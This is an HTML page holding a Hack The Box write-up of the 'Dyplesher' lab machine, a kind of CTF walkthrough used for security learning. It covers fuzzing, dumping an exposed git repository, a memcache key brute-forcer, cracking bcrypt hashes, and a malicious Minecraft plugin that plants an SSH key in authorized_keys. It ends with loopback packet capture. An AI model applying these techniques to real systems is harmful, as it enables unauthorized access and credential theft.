@@ -1,0 +1,884 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Dyplesher - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Dyplesher was a pretty tough box that took me more than 10 hours to get to the user flag. There’s quite a bit of enumeration required to get to the git repo and then find memcached credentials from the source code. I couldn’t use the memcache module from Metasploit here since it doesn’t support credentials so I wrote my own memcache enumeration script. We then make our way to more creds in Gogs, then craft a malicious Minecraft plugin to get RCE. To get to the first flag we’ll sniff AMQP creds from the loopback interface. To priv esc, we send messages on the RabbitMQ bug and get the server to download and execute a lua script (Cubberite plugin).">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Dyplesher - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-dyplesher/">
+
+
+  <meta property="og:description" content="Dyplesher was a pretty tough box that took me more than 10 hours to get to the user flag. There’s quite a bit of enumeration required to get to the git repo and then find memcached credentials from the source code. I couldn’t use the memcache module from Metasploit here since it doesn’t support credentials so I wrote my own memcache enumeration script. We then make our way to more creds in Gogs, then craft a malicious Minecraft plugin to get RCE. To get to the first flag we’ll sniff AMQP creds from the loopback interface. To priv esc, we send messages on the RabbitMQ bug and get the server to download and execute a lua script (Cubberite plugin).">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-dyplesher/dyplesher_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-10-24T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-dyplesher/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Dyplesher - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Dyplesher - Hack The Box">
+    <meta itemprop="description" content="Dyplesher was a pretty tough box that took me more than 10 hours to get to the user flag. There’s quite a bit of enumeration required to get to the git repo and then find memcached credentials from the source code. I couldn’t use the memcache module from Metasploit here since it doesn’t support credentials so I wrote my own memcache enumeration script. We then make our way to more creds in Gogs, then craft a malicious Minecraft plugin to get RCE. To get to the first flag we’ll sniff AMQP creds from the loopback interface. To priv esc, we send messages on the RabbitMQ bug and get the server to download and execute a lua script (Cubberite plugin).">
+    <meta itemprop="datePublished" content="October 24, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Dyplesher - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-10-24T00:00:00+02:00">October 24, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-dyplesher/dyplesher_logo.png" alt="" /></p>
+
+<p>Dyplesher was a pretty tough box that took me more than 10 hours to get to the user flag. There’s quite a bit of enumeration required to get to the git repo and then find memcached credentials from the source code. I couldn’t use the memcache module from Metasploit here since it doesn’t support credentials so I wrote my own memcache enumeration script. We then make our way to more creds in Gogs, then craft a malicious Minecraft plugin to get RCE. To get to the first flag we’ll sniff AMQP creds from the loopback interface. To priv esc, we send messages on the RabbitMQ bug and get the server to download and execute a lua script (Cubberite plugin).</p>
+
+<h2 id="portscan">Portscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ sudo nmap -sT -p- 10.10.10.190
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 20:59 EDT
+Nmap scan report for dyplesher.htb (10.10.10.190)
+Host is up (0.019s latency).
+Not shown: 65525 filtered ports
+PORT      STATE  SERVICE
+22/tcp    open   ssh
+80/tcp    open   http
+3000/tcp  open   ppp
+4369/tcp  open   epmd
+5672/tcp  open   amqp
+11211/tcp open   memcache
+25562/tcp open   unknown
+25565/tcp open   minecraft
+25672/tcp open   unknown
+</code></pre></div></div>
+
+<h2 id="website">Website</h2>
+
+<p>On the website we have a couple of non-functional links like <strong>Forums</strong> and <strong>Store</strong>. The <strong>Staff</strong> link goes to another static page with a list of staff users.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524104320814.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524104356684.png" alt="" /></p>
+
+<p>Dirbusting shows a few interesting links: <strong>login</strong>, <strong>register</strong> and <strong>home</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ ffuf -w $WLRD -t 50 -u http://dyplesher.htb/FUZZ
+________________________________________________
+
+css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
+js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
+login                   [Status: 200, Size: 4188, Words: 1222, Lines: 84]
+register                [Status: 302, Size: 350, Words: 60, Lines: 12]
+img                     [Status: 301, Size: 312, Words: 20, Lines: 10]
+home                    [Status: 302, Size: 350, Words: 60, Lines: 12]
+fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
+staff                   [Status: 200, Size: 4389, Words: 1534, Lines: 103]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
+</code></pre></div></div>
+
+<p>The login and register URL show a login page. We can try a few default creds but we’re not able to get in.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524105136663.png" alt="" /></p>
+
+<p>Gobusting the home directory shows a couple of other directories, all of which we can’t reach because we are redirected to the login page.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ ffuf -w $WLRW -t 50 -u http://dyplesher.htb/home/FUZZ
+________________________________________________
+
+add                     [Status: 302, Size: 350, Words: 60, Lines: 12]
+.                       [Status: 301, Size: 312, Words: 20, Lines: 10]
+delete                  [Status: 302, Size: 350, Words: 60, Lines: 12]
+reset                   [Status: 302, Size: 350, Words: 60, Lines: 12]
+console                 [Status: 302, Size: 350, Words: 60, Lines: 12]
+players                 [Status: 302, Size: 350, Words: 60, Lines: 12]
+</code></pre></div></div>
+
+<h2 id="gogs-website">Gogs website</h2>
+
+<p>There’s a Gogs instance running on port 3000. Gogs is a self-hosted Git service so there’s a good chance we’ll have to find the source code of an application on there.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524105548752.png" alt="" /></p>
+
+<p>We can see the same list of 3 users we saw on the Staff page but there are no public repositories accessible from our unauthenticated user.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524105743919.png" alt="" /></p>
+
+<p>When dirbusting the site we find a <strong>debug</strong> directory which contains the pprof profiler. I looked around and it didn’t seem to be useful for anything.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ ffuf -w $WLDC -t 50 -u http://dyplesher.htb:3000/FUZZ
+________________________________________________
+
+                        [Status: 200, Size: 7851, Words: 456, Lines: 252]
+admin                   [Status: 302, Size: 34, Words: 2, Lines: 3]
+assets                  [Status: 302, Size: 31, Words: 2, Lines: 3]
+avatars                 [Status: 302, Size: 32, Words: 2, Lines: 3]
+css                     [Status: 302, Size: 28, Words: 2, Lines: 3]
+debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]
+explore                 [Status: 302, Size: 37, Words: 2, Lines: 3]
+img                     [Status: 302, Size: 28, Words: 2, Lines: 3]
+issues                  [Status: 302, Size: 34, Words: 2, Lines: 3]
+js                      [Status: 302, Size: 27, Words: 2, Lines: 3]
+plugins                 [Status: 302, Size: 32, Words: 2, Lines: 3]
+</code></pre></div></div>
+
+<h2 id="vhost-fuzzing">Vhost fuzzing</h2>
+
+<p>We haven’t found much yet so we’ll try fuzzing vhosts next and we find a <strong>test.dyplesher.htb</strong> vhost.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -H "Host: FUZZ.dyplesher.htb" -u http://dyplesher.htb -fr "Worst Minecraft Server"
+________________________________________________
+
+test                    [Status: 200, Size: 239, Words: 16, Lines: 15]
+</code></pre></div></div>
+
+<p>There’s a memcache test interface running on the vhost where we can add key/values to the memcache instance running on port 11211. There doesn’t seem to be any vulnerability that I can see on this page.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524110832067.png" alt="" /></p>
+
+<p>When dirbusting we find a git repository, then we can use git-dumper to copy it to our local machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ ffuf -w $WLDC -t 50 -u http://test.dyplesher.htb/FUZZ
+________________________________________________
+
+index.php               [Status: 200, Size: 239, Words: 16, Lines: 15]
+                        [Status: 200, Size: 239, Words: 16, Lines: 15]
+.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
+.htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 283, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]
+
+snowscan@kali:~/htb/dyplesher/git$ ~/tools/git-dumper/git-dumper.py http://test.dyplesher.htb .
+[-] Testing http://test.dyplesher.htb/.git/HEAD [200]
+[-] Testing http://test.dyplesher.htb/.git/ [403]
+[-] Fetching common files
+[-] Fetching http://test.dyplesher.htb/.gitignore [404]
+[-] Fetching http://test.dyplesher.htb/.git/description [200]
+[-] Fetching http://test.dyplesher.htb/.git/COMMIT_EDITMSG [200]
+[...]
+</code></pre></div></div>
+
+<p>Inside, we find the source code of the memcache test application, along with the memcache credentials: <code class="language-plaintext highlighter-rouge">felamos / zxcvbnm</code></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;pre&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'add'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'val'</span><span class="p">]){</span>
+	<span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Memcached</span><span class="p">();</span>
+	<span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">setOption</span><span class="p">(</span><span class="nc">Memcached</span><span class="o">::</span><span class="no">OPT_BINARY_PROTOCOL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+	<span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">setSaslAuthData</span><span class="p">(</span><span class="s2">"felamos"</span><span class="p">,</span> <span class="s2">"zxcvbnm"</span><span class="p">);</span>
+	<span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">addServer</span><span class="p">(</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="mi">11211</span><span class="p">);</span>
+	<span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">add</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'add'</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'val'</span><span class="p">]);</span>
+	<span class="k">echo</span> <span class="s2">"Done!"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+	<span class="k">echo</span> <span class="s2">"its equal"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/pre&gt;</span>
+</code></pre></div></div>
+
+<h2 id="memcache-enumeration">Memcache enumeration</h2>
+
+<p>We don’t have the list of memcache keys but we can write a script that will brute force them and return the values.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">bmemcached</span>
+<span class="kn">from</span> <span class="nn">pprint</span> <span class="kn">import</span> <span class="n">pprint</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">bmemcached</span><span class="p">.</span><span class="n">Client</span><span class="p">(</span><span class="s">'10.10.10.190:11211'</span><span class="p">,</span> <span class="s">'felamos'</span><span class="p">,</span> <span class="s">'zxcvbnm'</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/usr/share/seclists/Discovery/Variables/secret-keywords.txt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span><span class="n">x</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()]:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+        <span class="k">if</span> <span class="s">'None'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+        	<span class="k">print</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">result</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The memcache instance contains some email addresses, usernames and password hashes that we will try to crack.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ ./brute_keys.py 
+email: MinatoTW@dyplesher.htb
+felamos@dyplesher.htb
+yuntao@dyplesher.htb
+
+password: $2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
+$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
+$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
+
+username: MinatoTW
+felamos
+yuntao
+</code></pre></div></div>
+
+<p>We’re able to crack the password for user felamos: <code class="language-plaintext highlighter-rouge">mommy1</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ john -w=/usr/share/wordlists/rockyou.txt memcache-hashes.txt 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
+Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mommy1           (?)
+
+snowscan@kali:~/htb/dyplesher$ cat ~/.john/john.pot 
+$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK:mommy1
+</code></pre></div></div>
+
+<h2 id="getting-access-to-the-gogs-repository">Getting access to the Gogs repository</h2>
+
+<p>We’re able to log into the Gogs instance with Felamos’ credentials. There’s two repositories available: <strong>gitlab</strong> and <strong>memcached</strong>.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524112126061.png" alt="" /></p>
+
+<p>The memcached repo contains the same information we got earlier from the .git directory on the test.dyplesher.htb website. However the gitlab repo contains a zipped backup of the repositories.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524112259332.png" alt="" /></p>
+
+<p>After unzipping the file, we get a bunch of directories with .bundle files. These are essentially a full repository in single file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ ls -laR repositories/
+repositories/:
+total 12
+[...]
+repositories/@hashed/4b/22:
+total 24
+drwxr-xr-x 3 snowscan snowscan  4096 Sep  7  2019 .
+drwxr-xr-x 3 snowscan snowscan  4096 Sep  7  2019 ..
+drwxr-xr-x 2 snowscan snowscan  4096 Sep  7  2019 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
+-rw-r--r-- 1 snowscan snowscan 10837 Sep  7  2019 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
+</code></pre></div></div>
+
+<p>We can use the git clone command to extract the repository files from those bundle files. There are 4 repositories inside the backup file:</p>
+
+<ul>
+  <li>VoteListener</li>
+  <li>MineCraft server</li>
+  <li>PhpBash</li>
+  <li>NightMiner</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher/git-backup$ ls -la
+total 28
+drwxr-xr-x 7 snowscan snowscan 4096 May 23 16:55 .
+drwxr-xr-x 6 snowscan snowscan 4096 May 24 11:26 ..
+drwxr-xr-x 4 snowscan snowscan 4096 May 23 15:44 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
+drwxr-xr-x 8 snowscan snowscan 4096 May 23 23:42 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
+drwxr-xr-x 3 snowscan snowscan 4096 May 23 15:43 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+drwxr-xr-x 3 snowscan snowscan 4096 May 23 15:43 d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35
+</code></pre></div></div>
+
+<p>There’s an SQLite database file inside the <strong>LoginSecurity</strong> directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher/git-backup$ ls -l 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/
+total 8
+-rw-r--r-- 1 snowscan snowscan  396 May 24 00:44 config.yml
+-rw-r--r-- 1 snowscan snowscan 3072 May 23 15:43 users.db
+snowscan@kali:~/htb/dyplesher/git-backup$ file 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db 
+4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db: SQLite 3.x database, last written using SQLite version 3007002
+</code></pre></div></div>
+
+<p>The file contains another set of hashed credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlite3 ./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite&gt; .tables
+users
+sqlite&gt; select * from users;
+18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81
+</code></pre></div></div>
+
+<p>Here we go, got another password: <code class="language-plaintext highlighter-rouge">alexis1</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ john -w=/usr/share/wordlists/rockyou.txt git-hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alexis1          (?)
+1g 0:00:00:06 DONE (2020-05-24 11:36) 0.1501g/s 243.2p/s 243.2c/s 243.2C/s alexis1..serena
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<h2 id="rce-using-minecraft-plugin">RCE using Minecraft plugin</h2>
+
+<p>Now that we have more credentials, we can go back to the main webpage and log in. We have a dashboard with some player statistics and a menu to upload plugins.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524113803504.png" alt="" /></p>
+
+<p>The console displays the messages from the server.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524113905691.png" alt="" /></p>
+
+<p>Looks like we’ll have to create a plugin to get access to the server. We can follow the following blog post instructions on how to create a plugin with Java: <a href="https://bukkit.gamepedia.com/Plugin_Tutorial">https://bukkit.gamepedia.com/Plugin_Tutorial</a></p>
+
+<p>After trying a couple of different payloads I wasn’t able to get anything to connect back to me so I assumed there was a firewall configured to block outbound connections. So instead I used the following to write my SSH keys to MinatoTW home directory:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">pwn.snowscan.plugin</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.bukkit.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.bukkit.plugin.java.JavaPlugin</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.logging.Logger</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">main</span> <span class="kd">extends</span> <span class="nc">JavaPlugin</span> <span class="o">{</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onEnable</span><span class="o">()</span> <span class="o">{</span>    	
+    	<span class="nc">Bukkit</span><span class="o">.</span><span class="na">getServer</span><span class="o">().</span><span class="na">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span><span class="o">);</span>
+    	<span class="k">try</span> <span class="o">{</span>
+		    <span class="nc">FileWriter</span> <span class="n">myWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileWriter</span><span class="o">(</span><span class="s">"/home/MinatoTW/.ssh/authorized_keys"</span><span class="o">);</span>
+		    <span class="n">myWriter</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">"ssh-rsa AAAAB3NzaC1yc2EAAA[...]JsSkunC1TzjHyY70NfMskJViGcs= snowscan@kali"</span><span class="o">);</span>
+		    <span class="n">myWriter</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+		    <span class="nc">Bukkit</span><span class="o">.</span><span class="na">getServer</span><span class="o">().</span><span class="na">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"Successfully wrote to the file."</span><span class="o">);</span>
+		<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+			<span class="nc">Bukkit</span><span class="o">.</span><span class="na">getServer</span><span class="o">().</span><span class="na">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"An error occurred."</span><span class="o">);</span>
+		    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+		<span class="o">}</span>
+    	<span class="nc">Bukkit</span><span class="o">.</span><span class="na">getServer</span><span class="o">().</span><span class="na">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY"</span><span class="o">);</span>
+    <span class="o">}</span>
+    
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onDisable</span><span class="o">()</span> <span class="o">{</span>
+    	
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>After adding and reloading the script, our SSH public key is written to the home directory and we can log in.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524114411007.png" alt="" /></p>
+
+<h2 id="privesc-to-felamos">Privesc to Felamos</h2>
+
+<p>Our user is part of the wireshark group so there’s a good chance the next part involves traffic sniffing.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MinatoTW@dyplesher:~$ id
+uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
+</code></pre></div></div>
+
+<p>As suspected, the dumpcat program has been configured to with elevated capabilities:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MinatoTW@dyplesher:~$ getcap -r / 2&gt;/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip
+</code></pre></div></div>
+
+<p>We’ll capture packets on the loopback interface in order to capture some of traffic for the RabbitMQ instance.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MinatoTW@dyplesher:~$ dumpcap -i lo -w local.pcap
+Capturing on 'Loopback: lo'
+File: local.pcap
+Packets: 90
+</code></pre></div></div>
+
